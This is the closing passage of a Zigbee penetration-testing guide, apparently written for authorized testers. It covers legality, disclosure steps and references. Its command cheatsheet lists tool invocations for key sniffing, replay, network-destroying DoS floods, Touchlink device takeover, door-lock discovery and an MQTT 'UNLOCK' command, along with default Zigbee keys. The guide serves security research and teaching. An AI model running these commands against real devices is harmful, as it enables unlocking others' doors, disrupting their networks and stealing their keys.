| Activity | Status |
|----------|--------|
| Passive RF capture (your own devices/network) | ✅ Generally lawful |
| Passive capture on a neighbor's network | ❌ ILLEGAL — ECPA violation |
| Active injection (your own devices) | ✅ With owner permission |
| Touchlink factory reset (your own device) | ✅ With owner permission |
| Touchlink attack on neighbor's device | ❌ ILLEGAL |
| Zigbee jamming in Faraday cage | ✅ Authorized test |
| Zigbee jamming on public frequencies | ❌ ILLEGAL (FCC § 333) |
| Firmware extraction (own device) | ✅ Legal (voids warranty) |

### 27.3 Responsible Disclosure

If vulnerabilities discovered in Zigbee devices during authorized testing:
1. Document with technical evidence (pcap files, PoC scripts)
2. Contact vendor: security@[vendor].com
3. 90-day coordinated disclosure window (CERT/CC standard)
4. Report to CSA (Connectivity Standards Alliance): https://csa-iot.org/contact/
5. CVE request via MITRE if warranted: https://cveform.mitre.org
6. For TI Z-Stack: ti_psirt@ti.com
7. For Silicon Labs EmberZNet: https://www.silabs.com/support/product-security

---

## 28. References & Trusted Sources

### Official Standards & Documentation
- Zigbee Specification (CSA): https://csa-iot.org/developer-resource/specifications-download-request/
- IEEE 802.15.4-2020: https://standards.ieee.org/standard/802_15_4-2020.html
- Zigbee Alliance Security Guide: https://csa-iot.org/developer-resource/zigbee-security-resources/
- NXP Maximizing Zigbee Security: https://www.nxp.com/docs/en/supporting-information/MAXSECZBNETART.pdf
- Silicon Labs Zigbee Security: https://github.com/SiliconLabsSoftware/zigbee_applications/blob/master/zigbee_concepts/Zigbee-Networking-Concepts/Networking%20Concepts%20-%20Zigbee%20Security.md

### Security Research (Conference/Peer-Reviewed)
- KillerBee Framework (River Loop Security): https://riverloopsecurity.com/projects/killerbee/
- ZigDiggity (Bishop Fox, Black Hat 2019): https://bishopfox.com/blog/zigbee-hacking-smarter-home-invasion-with-zigdiggity
- Z3sec / Touchlink (WiSec 2017): https://github.com/IoTsec/Z3sec — Morgner et al., FAU
- "Don't Kick the Beehive" (ACM CCS 2022): https://personal.utdallas.edu/~shao/papers/wang_ccs22.pdf
- Z-Fuzzer (ACM DTRAP 2022): https://dl.acm.org/doi/10.1145/3551894
- Rejoin Vulnerabilities (RAID 2022): Wang, Li, Sun, Lui
- Analyzing Zigbee Attack Landscape (WiSec 2020): https://syed-rafiul-hussain.github.io/wp-content/uploads/2020/05/analyzing-zigbee-attacks.pdf
- Philips Hue Worm (Check Point, 2020): https://research.checkpoint.com/2020/check-point-discovers-vulnerabilities-in-philips-hue-smart-bulbs-that-allow-hackers-to-infiltrate-networks-from-bulbs/
- OSRAM Lightify CVEs (Rapid7, 2016): https://www.rapid7.com/blog/post/2016/07/26/r7-2016-10-multiple-osram-sylvania-osram-lightify-vulnerabilities-cve-2016-5051-through-5059/
- Comprehensive ZigBee 3.0 Security Analysis (PMC, 2025): https://pmc.ncbi.nlm.nih.gov/articles/PMC12349651/

### GitHub Repositories
- KillerBee (primary): https://github.com/riverloopsec/killerbee
- ZigDiggity 2.0: https://github.com/BishopFox/zigdiggity
- Z3sec: https://github.com/IoTsec/Z3sec
- Z-Fuzzer: https://github.com/zigbeeprotocol/Z-Fuzzer
- Zigator: https://github.com/akestoridis/zigator
- Zigbee2MQTT: https://github.com/Koenkk/zigbee2mqtt
- gr-ieee802-15-4 (GNU Radio): https://github.com/bastibl/gr-ieee802-15-4
- Scapy (Zigbee layers built-in): https://github.com/secdev/scapy
- SecBee (archived): https://github.com/Cognosec/SecBee
- HardwareAllTheThings Zigbee: https://swisskyrepo.github.io/HardwareAllTheThings/protocols/zigbee/

### Tools & Resources
- Zigbee2MQTT Sniffer Guide: https://www.zigbee2mqtt.io/advanced/zigbee/04_sniff_zigbee_traffic.html
- Zigbee2MQTT Supported Adapters: https://www.zigbee2mqtt.io/guide/adapters/
- TI PACKET-SNIFFER: https://www.ti.com/tool/PACKET-SNIFFER
- TI CC Debugger: https://www.ti.com/tool/CC-DEBUGGER
- CSA Product Database: https://csa-iot.org/csa-iot_products/

### Books
- *The IoT Hacker's Handbook* — Aditya Gupta (Chapter on Zigbee)
- *Practical IoT Hacking* — Fotios Chantzis et al., No Starch Press
- *Zigbee Wireless Networks and Transceivers* — Shahin Farahani

---

## Appendix A — Quick Reference Command Cheatsheet

```bash
# ============================================================
# ZIGBEE PENTEST QUICK REFERENCE
# ============================================================

# SETUP / IDENTIFY HARDWARE
zbid                              # List KillerBee interfaces
zbid -s                           # Detailed interface info

# PASSIVE CAPTURE
zbdump -c 11 -w cap.pcap          # Capture channel 11
zbdump -c 15 -w cap.pcap -t 120   # 2-minute capture ch 15

# LIVE WIRESHARK
zbwireshark -c 15 &               # Pipe to Wireshark
wireshark -k -i $(zbwireshark -c 15 2>&1 | grep pipe | awk '{print $NF}')

# NETWORK DISCOVERY
zbstumbler -v                     # Scan all channels, verbose
zbstumbler -c 15 -v -t 60         # Scan ch 15 for 60 seconds
zbfind -c 15                      # RSSI-based device location (GUI)

# KEY SNIFFING
zbdsniff -c 15 -w keys.pcap       # Capture + auto key detection

# REPLAY ATTACK
zbreplay -f capture.pcap -c 15    # Replay capture on ch 15

# DENIAL OF SERVICE  ⚠️ Faraday cage ONLY
zbpanidconflictflood -c 15        # PAN ID conflict (destroys network!)
zborphannotify -c 15              # Orphan notification flood
zbrealign -c 15                   # PAN realignment spoof

# Z3SEC TOUCHLINK
z3sec_touchlink scan -c 11 --sdr              # Scan for devices
z3sec_touchlink reset_factory -c 11 --target EUI --sdr  # Factory reset
z3sec_touchlink join_network -c 11 --target EUI --new_pan 0x1337 --sdr
z3sec_key_extract --channel 11 --kb /dev/ttyUSBX  # Key extraction

# ZIGDIGGITY (on Raspberry Pi + RaspBee)
python3 beacon.py -c 11           # Find networks
python3 find_locks.py -c 11       # Locate door locks
python3 ack_attack.py -c 11 --target 0x1234  # DoS device
python3 insecure_rejoin.py -c 11 --pan_id 0xABCD  # Rejoin attack

# MQTT TESTING
mosquitto_sub -h 192.168.1.X -p 1883 -t "zigbee2mqtt/#" -v  # Listen all
mosquitto_pub -h 192.168.1.X -p 1883 -t "zigbee2mqtt/lock/set" -m '{"state":"UNLOCK"}'

# ZIGBEE2MQTT API
curl http://192.168.1.X:8080/api/devices          # List devices
curl -X POST http://192.168.1.X:8080/api/devices/DEVICE/set \
     -d '{"state":"OFF"}'                         # Send command

# FIRMWARE ANALYSIS
binwalk -e firmware.hex           # Extract firmware
strings firmware.bin | grep key   # Search for keys
zbgoodfind -p cap.pcap -m nvm.bin # Find key in memory dump

# WIRESHARK ZIGBEE KEYS (add in Edit → Preferences → Protocols → Zigbee NWK)
# HA Default TCLK:  5A6967426565416C6C69616E636530 39
# ZLL Master Key:   9F5595F10257C8A965370BC22A8B0244
```

---

## Appendix B — Zigbee Channel to Frequency Reference

| Channel | Center Frequency | Wi-Fi Overlap | Common Use |
|---------|-----------------|---------------|-----------|
| 11 | 2405 MHz | No | Philips Hue, common |
| 12 | 2410 MHz | No | |
| 13 | 2415 MHz | No | |
| 14 | 2420 MHz | No | |
| 15 | 2425 MHz | Partial ch1 | Common HA channel |
| 16 | 2430 MHz | Partial ch1 | |
| 17 | 2435 MHz | No | |
| 18 | 2440 MHz | No | |
| 19 | 2445 MHz | Partial ch6 | |
| 20 | 2450 MHz | Partial ch6 | Common |
| 21 | 2455 MHz | Partial ch6 | |
| 22 | 2460 MHz | No | |
| 23 | 2465 MHz | Partial ch11 | |
| 24 | 2470 MHz | Partial ch11 | |
| 25 | 2475 MHz | Partial ch11 | |
| 26 | 2480 MHz | No | EU popular, outside Wi-Fi |

---

*Document Version: 1.0 | Date: March 2026 | Based on Zigbee Specification 3.0 + CSA 2024*  
*Intended for authorized security researchers and penetration testers only*  
*All research cited is from publicly disclosed, peer-reviewed, and conference-presented sources*
